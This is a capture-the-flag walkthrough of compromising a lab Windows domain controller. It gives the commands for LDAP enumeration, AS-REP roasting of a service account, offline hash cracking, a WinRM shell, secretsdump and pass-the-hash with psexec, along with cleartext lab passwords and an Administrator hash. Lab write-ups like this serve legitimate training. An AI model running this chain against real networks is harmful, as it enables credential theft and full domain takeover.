![[Pasted image 20210425185250.png]]

Starting with a basic nmap scan 

`nmap -sC -sV 10.10.10.30`

![[Pasted image 20210425185615.png]]

We have the credentials of the user sandra from the previous box 

username : `sandra`

password : `Password1234!`

Using the tool ldapdomaindump 

`ldapdomaindump -u MEGACORP\\sandra -p Password1234! 10.10.10.30`

![[Pasted image 20210425193139.png]]

Domain users : 

![[Pasted image 20210425194303.png]]

Here the `Don't Pre-Auth` is enabled for the user `svc_bes`

Which allows us to send a dummy Ticket to the Kerberos-TGT get the hash and crack it offline 

By using the impacket module GetNPUser we get the hash of the given user

`impacket-GetNPUsers -request -no-pass -format john -dc-ip 10.10.10.30 MEGACORP/svc_bes`

![[Pasted image 20210425194658.png]]

Passing the hash to john , We get  

![[Pasted image 20210425195731.png]]

username : `svc_bes`

password : `Sheffield19`

Here we see that no share is accessible by us

user : svc_bes

![[Pasted image 20210425200526.png]]

user : sandra

![[Pasted image 20210425200626.png]]

Now by using the tool evil-winrm we get the shell for the user svc_bes

`evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19 `

![[Pasted image 20210425201445.png]]

And we get the user.txt in the Desktop of the user svc_bes

![[Pasted image 20210425201617.png]]

Now we can use the impacket module named secretsdump to get the hashes of the user accounts which we can further use with the psexec to perform the Pass-The-Hash attack

![[Pasted image 20210425202020.png]]

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::`

Now that we have got the NTLM hashes for all the users including the Administrator we can use psexec to perform the Pass-The-Hash attack

`impacket-psexec Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18`

![[Pasted image 20210425202713.png]]

Now we are the NT\Authority and we have acquired the root.txt flag

